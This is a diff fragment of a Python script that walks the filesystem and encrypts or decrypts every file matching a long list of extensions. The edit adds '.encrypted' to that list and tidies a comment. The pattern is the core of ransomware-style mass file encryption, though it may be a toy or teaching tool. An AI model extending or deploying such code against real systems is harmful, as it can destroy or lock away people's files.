@@ -7,7 +7,7 @@ import os
 # and sends them off to be encrypted or decrypted
 def main():
 
-    # Get the key and mode from the user
+    # Create the key and get mode from the user
     key = createKey()
     mode = input('Select "encrypt" or "decrypt": ')
 
@@ -19,7 +19,7 @@ def main():
            '.java', '.jsp', '.js', '.xml', '.xsl', '.xsd', '.xslt', '.xlog',
            '.json', '.py', '.rtf', '.srt', '.sub', '.csv', '.conf', '.log',
            '.manifest', '.lrc', '.html5', '.linux', '.sha1', '.sha512',
-           '.err', '.readme', '.man')
+           '.err', '.readme', '.man', '.encrypted')
 
     # Search the filesystem. For each file found, check if the extension is
     # on the supported list. If it is, create a full filename including
@@ -32,7 +32,6 @@ def main():
                     encrypt(key, mode, filename)
                 elif mode == 'decrypt':
                     decrypt(key, mode, filename)
-
 
 
 main()
